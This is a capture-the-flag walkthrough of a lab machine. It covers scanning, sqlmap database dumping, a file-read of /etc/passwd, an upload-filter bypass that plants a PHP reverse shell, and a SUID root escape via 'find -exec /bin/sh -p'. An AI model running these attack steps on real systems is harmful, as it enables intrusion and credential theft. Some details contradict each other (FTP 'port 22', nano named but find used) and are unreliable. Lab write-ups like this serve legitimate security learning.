![expose](/Image/expose/i1.png)


## step_1: Nmap scanning
```
nmap ip -sV -sC -v -Pn -p-
```
- output
```
21 (FTP), 22 (SSH), 53 (DNS), 1337 (HTTP), and 1883 (MQTT) open
```

## step_2: Try to login as anonymous user of ftp port 22
```
ftp ip
```
- Successfully login but don't get any important info..
![ftp](/Image/expose/i2.png)

## step_3: Checking hidden subdirectory using gobuster
```
gobuster dir -u http://10.81.136.134:1337 -w /usr/share/wordlists/dirb/big.txt -t 4
```
![gobuster](/Image/expose/i3.png)

## step_4: Visiting http://10.81.136.134:1337/admin shows a login page; however, exploring it reveals that the login button does not function
![/admin](/Image/expose/i4.png)

## step_5: Visiting http://10.81.136.134:1337/admin_101 shows a login page, and it's function

- Here a spesic username is given and a give a password and capture the request by the burpsuite..

![burp](/Image/expose/i5.png)

- given backend query in response 
```
SELECT * FROM user WHERE email = 'hacker@root.thm'
```

## step_5: Extraction with SQLMap

```
sqlmap -r req.req --dbs --batch
```

- here req.req is the saved request from burp.. Here I find a database named **expose**

## step_6: Find tables of expose db
```
sqlmap -r req.req -p 'password, email' -D expose --tables
```

- 2 tables: user and config

## step_7: Find columns of user table
```
sqlmap -r req.req -p 'password, email' --batch -D expose -T user --columns --dump
```
- get the pass " **VeryDifficultPassword!!#@#@!#!@#1231** " of the **hacker@root.thm** user

## step_8: Find columns of config table

```
sqlmap -r req.req -p 'password, email' --batch -D expose -T config --columns --dump
```

- /file1010111/index.php with the credential easytohack
- /upload-cv00101011/index.php

## step_9: go to the /upload-cv00101011/index.php and get a hint ..pass "It is the name of machine user starting with letter **z** "

## step_10 : go to file1010111/index.php and login with the credentials which i found in config table

![file1010111](/Image/expose/i6.png)
- The page provides a hint regarding parameter fuzzing hiding the DOM

## step_11:  Now try to get /etc/passwd file 
![/etc/passwd](/Image/expose/i7.png)

- get the username whose name start with **z**

## step_12: Now login /upload-cv00101011/index.php via the username as the pass 

![loginn/uplo..](/Image/expose/i8.png)

## step_13: In page  source of this page a hidden path is given where the uploaded file is saved

![uploaded file](/Image/expose/i9.png)

## step_14: The upload form only permits .png files, so I implemented an extension bypass. First, I renamed my PHP reverse shell file to end in .png .Keeping Burp Suite intercept active, I uploaded the file. In the captured Burp request, I edited the filename back to .php and forwarded the packet. 


## step_15: go to the hidden dir **upload-cv00101011/upload_thm_1001/** 

## step_16: run netcat listener
![netcat](/Image/expose/i10.png)
- Here when i click on the file i uploaded "php reverse shell" , I get the shell 

## step_17: Show all the files and find important credentials
![cred_of_zeamkish_user](/Image/expose/i11.png)

- Here I get ssh login cred of zeamkish user

## step_18: Login as zeamkish user via ssh
![ssh_login](/Image/expose/i12.png)

- Here i got the user flag
## step_19: Try to access /root folder
![/root](/Image/expose/i13.png)

## step_20: Need to Privilege escalate for get the root access. Check the suid access 
```
find / -perm -4000 -type f 2>/dev/null
```
![suid_perm](/Image/expose/i14.png)

- I see /usr/bin/nano in the list

## step_21: GTFOBins for a nano-based SUID escape
```
find . -exec /bin/sh -p \; -quit
```
![root](/Image/expose/i15.png)

- Got the root flag
